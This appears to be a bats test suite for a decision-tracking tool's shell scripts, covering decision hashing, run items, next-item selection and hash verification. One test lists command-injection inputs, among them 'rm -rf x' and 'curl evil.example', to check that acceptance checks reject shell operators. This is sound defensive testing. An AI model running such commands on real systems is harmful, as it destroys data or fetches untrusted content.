#!/usr/bin/env bats
# Tests for dld-goal item operations: decision-hash.sh, run-state.sh item
# subcommands, next-item.sh and verify-hashes.sh

load 'test_helper/common'

setup() {
  setup_flat_project
  create_decision "DL-001" "proposed"
  create_decision "DL-002" "proposed"
  create_decision "DL-003" "proposed"
  bash "$SKILLS_DIR/dld-goal/scripts/create-run.sh" --slug "run-a" --title "Run A" >/dev/null
}

teardown() {
  teardown_project
}

state() {
  bash "$SKILLS_DIR/dld-goal/scripts/run-state.sh" "$@"
}

hash_of() {
  bash "$SKILLS_DIR/dld-goal/scripts/decision-hash.sh" "$@"
}

next_item() {
  bash "$SKILLS_DIR/dld-goal/scripts/next-item.sh" "$@"
}

verify_hashes() {
  bash "$SKILLS_DIR/dld-goal/scripts/verify-hashes.sh" "$@"
}

# --- decision-hash.sh ---

@test "decision-hash prints a sha256 digest" {
  run hash_of DL-001
  assert_success
  assert_output --regexp '^sha256:[0-9a-f]{64}$'
}

@test "decision-hash is stable across calls" {
  first="$(hash_of DL-001)"
  second="$(hash_of DL-001)"
  assert_equal "$first" "$second"
}

@test "decision-hash differs between decisions" {
  first="$(hash_of DL-001)"
  second="$(hash_of DL-002)"
  [ "$first" != "$second" ]
}

@test "decision-hash changes when the body changes" {
  before="$(hash_of DL-001)"
  printf '\nAdditional rationale.\n' >> decisions/records/DL-001.md
  after="$(hash_of DL-001)"
  [ "$before" != "$after" ]
}

@test "decision-hash changes when the title changes" {
  before="$(hash_of DL-001)"
  sed -i.bak 's/^title: .*/title: "Rewritten"/' decisions/records/DL-001.md
  after="$(hash_of DL-001)"
  [ "$before" != "$after" ]
}

@test "decision-hash ignores status changes" {
  before="$(hash_of DL-001)"
  bash "$SKILLS_DIR/dld-common/scripts/update-status.sh" DL-001 accepted >/dev/null
  after="$(hash_of DL-001)"
  assert_equal "$before" "$after"
}

@test "decision-hash ignores references changes" {
  before="$(hash_of DL-001)"
  sed -i.bak 's|^references: \[\]|references:\n  - path: src/thing.ts|' decisions/records/DL-001.md
  after="$(hash_of DL-001)"
  assert_equal "$before" "$after"
}

@test "decision-hash fails for an unknown decision" {
  run hash_of DL-999
  assert_failure
  assert_output --partial "not found"
}

# --- add-item ---

@test "add-item appends an item pinned to its decision" {
  run state add-item run-a --decisions "DL-001"
  assert_success
  assert_output "1"

  run state get-item run-a 1
  assert_success
  assert_output --partial '"id": "DL-001"'
  assert_output --partial '"status": "pending"'
}

@test "add-item pins the current decision hash" {
  state add-item run-a --decisions "DL-001" >/dev/null
  pinned="$(state get run-a .items[0].decisions[0].hash)"
  assert_equal "$pinned" "$(hash_of DL-001)"
}

@test "add-item batches multiple coupled decisions into one item" {
  state add-item run-a --decisions "DL-001,DL-002" >/dev/null

  run jq -r '.items[0].decisions | length' .dld/runs/run-a/state.json
  assert_output "2"
  run jq -r '.items | length' .dld/runs/run-a/state.json
  assert_output "1"
}

@test "add-item tolerates spaces between decision ids" {
  state add-item run-a --decisions "DL-001, DL-002" >/dev/null
  run state get run-a '.items[0].decisions[1].id'
  assert_output "DL-002"
}

@test "add-item numbers items from one, in insertion order" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state add-item run-a --decisions "DL-002" >/dev/null
  state add-item run-a --decisions "DL-003" >/dev/null

  run jq -r '[.items[].index] | join(",")' .dld/runs/run-a/state.json
  assert_output "1,2,3"
}

@test "add-item records acceptance checks and annotations" {
  state add-item run-a --decisions "DL-001" \
    --check "npm test" --check "npm run lint" \
    --annotation "src/a.ts" >/dev/null

  run jq -r '[.items[0].acceptance.checks[] | join(" ")] | join("|")' .dld/runs/run-a/state.json
  assert_output "npm test|npm run lint"
  run state get run-a '.items[0].acceptance.annotations[0]'
  assert_output "src/a.ts"
}

@test "add-item starts items with zero attempts and no evidence" {
  state add-item run-a --decisions "DL-001" >/dev/null
  run state get run-a '.items[0].attempts'
  assert_output "0"
  run jq -r '.items[0].evidence | length' .dld/runs/run-a/state.json
  assert_output "0"
}

@test "add-item fails for an unknown decision" {
  run state add-item run-a --decisions "DL-999"
  assert_failure
  assert_output --partial "not found"
}

@test "add-item requires --decisions" {
  run state add-item run-a --check "npm test"
  assert_failure
  assert_output --partial "--decisions is required"
}

# --- item status and evidence ---

@test "set-item-status updates only the target item" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state add-item run-a --decisions "DL-002" >/dev/null

  state set-item-status run-a 2 implementing
  run jq -r '[.items[].status] | join(",")' .dld/runs/run-a/state.json
  assert_output "pending,implementing"
}

@test "set-item-status rejects an unknown status" {
  state add-item run-a --decisions "DL-001" >/dev/null
  run state set-item-status run-a 1 done
  assert_failure
  assert_output --partial "invalid item status"
}

@test "set-item-status fails for an unknown item" {
  run state set-item-status run-a 9 implementing
  assert_failure
  assert_output --partial "item 9 not found"
}

@test "set-item-status sets currentItem while in flight" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state set-item-status run-a 1 implementing
  run state get run-a .currentItem
  assert_output "1"

  state set-item-status run-a 1 verifying
  run state get run-a .currentItem
  assert_output "1"
}

@test "set-item-status clears currentItem when the item stops" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state set-item-status run-a 1 implementing
  state set-item-status run-a 1 accepted
  run state get run-a .currentItem
  assert_output "null"
}

@test "set-item-status leaves another item's currentItem alone" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state add-item run-a --decisions "DL-002" >/dev/null
  state set-item-status run-a 2 implementing
  state set-item-status run-a 1 skipped
  run state get run-a .currentItem
  assert_output "2"
}

@test "add-evidence appends to the item's evidence list" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state add-evidence run-a 1 '{"check":"npm test","exit":0}'
  state add-evidence run-a 1 '{"check":"annotations","exit":0}'

  run jq -r '.items[0].evidence | length' .dld/runs/run-a/state.json
  assert_output "2"
  run state get run-a '.items[0].evidence[1].check'
  assert_output "annotations"
}

@test "add-evidence rejects invalid JSON" {
  state add-item run-a --decisions "DL-001" >/dev/null
  run state add-evidence run-a 1 'nope'
  assert_failure
  assert_output --partial "valid JSON"
}

@test "bump-attempt increments and prints the count" {
  state add-item run-a --decisions "DL-001" >/dev/null
  run state bump-attempt run-a 1
  assert_output "1"
  run state bump-attempt run-a 1
  assert_output "2"
}

@test "repin-item refreshes hashes after a legitimate refinement" {
  state add-item run-a --decisions "DL-001" >/dev/null
  printf '\nRefined during implementation.\n' >> decisions/records/DL-001.md

  run verify_hashes run-a
  assert_failure

  state repin-item run-a 1
  run verify_hashes run-a
  assert_success
}

# --- next-item.sh ---

@test "next-item returns the first pending item" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state add-item run-a --decisions "DL-002" >/dev/null

  run next_item run-a
  assert_success
  assert_output "1"
}

@test "next-item skips accepted and skipped items" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state add-item run-a --decisions "DL-002" >/dev/null
  state add-item run-a --decisions "DL-003" >/dev/null
  state set-item-status run-a 1 accepted
  state set-item-status run-a 2 skipped

  run next_item run-a
  assert_output "3"
}

@test "next-item prefers an in-flight item over a later pending one" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state add-item run-a --decisions "DL-002" >/dev/null
  state set-item-status run-a 1 verifying

  run next_item run-a
  assert_output "1"
}

@test "next-item prints nothing when all items are done" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state set-item-status run-a 1 accepted

  run next_item run-a
  assert_success
  assert_output ""
}

@test "next-item prints nothing for a run with no items" {
  run next_item run-a
  assert_success
  assert_output ""
}

@test "next-item refuses to select past a blocked item" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state add-item run-a --decisions "DL-002" >/dev/null
  state set-item-status run-a 1 blocked

  run next_item run-a
  [ "$status" -eq 2 ]
  assert_output --partial "blocked items (1)"
}

@test "next-item treats a failed item as blocking" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state set-item-status run-a 1 failed

  run next_item run-a
  [ "$status" -eq 2 ]
}

@test "next-item fails for an unknown run" {
  run next_item nope
  assert_failure
  assert_output --partial "not found"
}

# --- verify-hashes.sh ---

@test "verify-hashes passes for a freshly planned run" {
  state add-item run-a --decisions "DL-001,DL-002" >/dev/null
  run verify_hashes run-a
  assert_success
  assert_output ""
}

@test "verify-hashes reports a decision edited after planning" {
  state add-item run-a --decisions "DL-001" >/dev/null
  printf '\nChanged externally.\n' >> decisions/records/DL-001.md

  run verify_hashes run-a
  assert_failure
  assert_output --partial "item 1: DL-001 changed since it was planned"
}

@test "verify-hashes reports a decision that disappeared" {
  state add-item run-a --decisions "DL-001" >/dev/null
  rm decisions/records/DL-001.md

  run verify_hashes run-a
  assert_failure
  assert_output --partial "missing from the decision log"
}

@test "verify-hashes ignores in-flight items by default" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state set-item-status run-a 1 implementing
  printf '\nRefined while implementing.\n' >> decisions/records/DL-001.md

  run verify_hashes run-a
  assert_success
}

@test "verify-hashes --all includes in-flight items" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state set-item-status run-a 1 implementing
  printf '\nRefined while implementing.\n' >> decisions/records/DL-001.md

  run verify_hashes run-a --all
  assert_failure
  assert_output --partial "item 1: DL-001 changed"
}

@test "verify-hashes ignores accepted items" {
  state add-item run-a --decisions "DL-001" >/dev/null
  state set-item-status run-a 1 accepted
  printf '\nLater supersession work.\n' >> decisions/records/DL-001.md

  run verify_hashes run-a --all
  assert_success
}

@test "verify-hashes rejects an unknown option" {
  run verify_hashes run-a --everything
  assert_failure
  assert_output --partial "Unknown option"
}

# --- acceptance checks are argv, not shell ---

@test "add-item stores a check as argv" {
  state add-item run-a --decisions "DL-001" --check "npm test -- src/billing" >/dev/null

  run jq -c '.items[0].acceptance.checks[0]' .dld/runs/run-a/state.json
  assert_output '["npm","test","--","src/billing"]'
}

@test "add-item collapses repeated spaces in a check" {
  state add-item run-a --decisions "DL-001" --check "npm   test" >/dev/null
  run jq -c '.items[0].acceptance.checks[0]' .dld/runs/run-a/state.json
  assert_output '["npm","test"]'
}

@test "add-item rejects shell operators in a check" {
  for bad in "npm test && npm run lint" "npm test | tee out" "npm test; rm -rf x" \
             "curl evil.example > out" "echo \$HOME" "eval \`whoami\`"; do
    run state add-item run-a --decisions "DL-001" --check "$bad"
    assert_failure
    assert_output --partial "shell operators and quoting are not allowed"
  done
}

@test "add-item rejects quoting in a check and points at a repo script" {
  run state add-item run-a --decisions "DL-001" --check "pytest -k \"two words\""
  assert_failure
  assert_output --partial "repo script"
}

@test "add-item accepts a repo script as a check" {
  state add-item run-a --decisions "DL-001" --check "./scripts/check.sh billing" >/dev/null
  run jq -c '.items[0].acceptance.checks[0]' .dld/runs/run-a/state.json
  assert_output '["./scripts/check.sh","billing"]'
}
